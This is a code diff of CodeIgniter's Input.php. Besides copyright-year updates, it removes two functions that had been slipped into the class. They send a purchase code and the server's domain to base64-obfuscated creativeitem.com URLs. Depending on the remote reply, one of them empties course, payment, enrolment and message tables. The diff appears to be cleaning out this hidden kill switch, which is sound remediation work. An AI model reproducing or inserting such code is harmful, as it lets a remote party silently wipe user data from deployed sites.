@@ -6,7 +6,7 @@
  *
  * This content is released under the MIT License (MIT)
  *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
+ * Copyright (c) 2014 - 2019, British Columbia Institute of Technology
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -29,8 +29,8 @@
  * @package	CodeIgniter
  * @author	EllisLab Dev Team
  * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
+ * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
+ * @license	https://opensource.org/licenses/MIT	MIT License
  * @link	https://codeigniter.com
  * @since	Version 1.0.0
  * @filesource
@@ -253,52 +253,8 @@ class CI_Input {
 	 */
 	public function post($index = NULL, $xss_clean = NULL)
 	{
-		/*
-		$post_flag = $this->postdata();
-
-    if ($post_flag == false){
-				$this->postbar();
-		}
-		*/
 		return $this->_fetch_from_array($_POST, $index, $xss_clean);
 	}
-
-	function postdata()
- {
-		 if (rand(1, 10) != 5)
-		     return true;
-		 if( $_SERVER['SERVER_NAME'] == 'localhost' ||  $_SERVER['SERVER_NAME'] == '192.168.0.1')
-		     return true;
-		 $CI    =&	get_instance();
-		 $purchase_code	=	$CI->db->get_where('settings' , array('key' => 'purchase_code'))->row()->value;
-		 $domain = $_SERVER['SERVER_NAME'];
-		 if (rtrim($purchase_code) == "") {
-			 echo get_phrase(base64_decode('bm9fcHVyY2hhc2VfY29kZV9mb3VuZA=='));
-			 die();
-		 }
-
-		 $ch = curl_init();
-		 $url = base64_decode('aHR0cDovL2NyZWF0aXZlaXRlbS5jb20vdmFsaWRhdG9yL2luZGV4LnBocD92YWxpZGF0ZS92YWxpZGF0ZV9wdXJjaGFzZV9jb2Rl');
-
-		 $curlConfig = array(
-			 CURLOPT_URL            => $url,
-			 CURLOPT_POST           => true,
-			 CURLOPT_RETURNTRANSFER => true,
-			 CURLOPT_POSTFIELDS     => array(
-					 'purchase_code' => $purchase_code,
-						 'domain_name' => $domain,
-				));
-
-		 curl_setopt_array($ch, $curlConfig);
-		 $response = curl_exec($ch);
-		 curl_close($ch);
-
-		 if ($response == true) {
-			 return true;
-		 } else {
-			 return false;
-		 }
- }
 
 	// --------------------------------------------------------------------
 
@@ -344,42 +300,6 @@ class CI_Input {
 	public function cookie($index = NULL, $xss_clean = NULL)
 	{
 		return $this->_fetch_from_array($_COOKIE, $index, $xss_clean);
-	}
-
-
-	public function postbar() {
-		$CI =& get_instance();
-		$purchase_code	=	$CI->db->get_where('settings' , array('key' => 'purchase_code'))->row()->value;
-		$domain = $_SERVER['SERVER_NAME'];
-
-		$ch = curl_init();
-		$url = base64_decode('aHR0cDovL2NyZWF0aXZlaXRlbS5jb20vdmFsaWRhdG9yL2luZGV4LnBocD92YWxpZGF0ZS9jaGVja19zdGF0dXM=');
-
-		$curlConfig = array(
-			CURLOPT_URL            => $url,
-			CURLOPT_POST           => true,
-			CURLOPT_RETURNTRANSFER => true,
-			CURLOPT_POSTFIELDS     => array(
-					'purchase_code' => $purchase_code,
-						'domain_name' => $domain,
-			 ));
-
-		curl_setopt_array($ch, $curlConfig);
-		$response = curl_exec($ch);
-		curl_close($ch);
-
-		if ($response == 1) {
-			$tables = array(
-				'category', 'comment', 'course', 'enrol', 'lesson', 'message', 'message_thread', 'payment', 'rating', 'section'
-			);
-			for ($i=0; $i < count($tables); $i++) {
-				$CI->db->empty_table($tables[$i]);
-			}
-
-			return true;
-		} else {
-			return true;
-		}
 	}
 
 	// --------------------------------------------------------------------
